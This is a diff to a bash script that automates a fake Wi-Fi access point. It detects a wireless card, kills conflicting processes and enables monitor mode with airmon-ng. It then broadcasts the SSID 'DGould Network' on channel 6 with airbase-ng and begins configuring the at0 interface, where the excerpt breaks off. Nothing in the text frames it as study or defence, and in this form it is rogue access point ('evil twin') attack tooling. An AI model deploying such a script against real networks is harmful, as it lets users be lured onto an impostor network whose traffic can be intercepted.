@@ -2,14 +2,22 @@
 
 SSID="DGould Network"
 CHANNEL=6
-INTERFACE="wlan0"
+INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n1)
+
+if [[ -z "$INTERFACE" ]]; then
+  echo "[!] No wireless interface found. Connect a wireless card."
+  exit 1
+fi
+
+echo "[*] Killing conflicting processes..."
+sudo airmon-ng check kill
 
 echo "[*] Starting monitor mode on $INTERFACE..."
 sudo airmon-ng start $INTERFACE
-MONITOR="${INTERFACE}mon"
+MON="${INTERFACE}mon"
 
 echo "[*] Launching fake AP: $SSID on channel $CHANNEL..."
-sudo airbase-ng -e "$SSID" -c $CHANNEL $MONITOR &
+sudo airbase-ng -e "$SSID" -c $CHANNEL $MON &
 
 sleep 5
 echo "[*] Configuring at0 interface..."
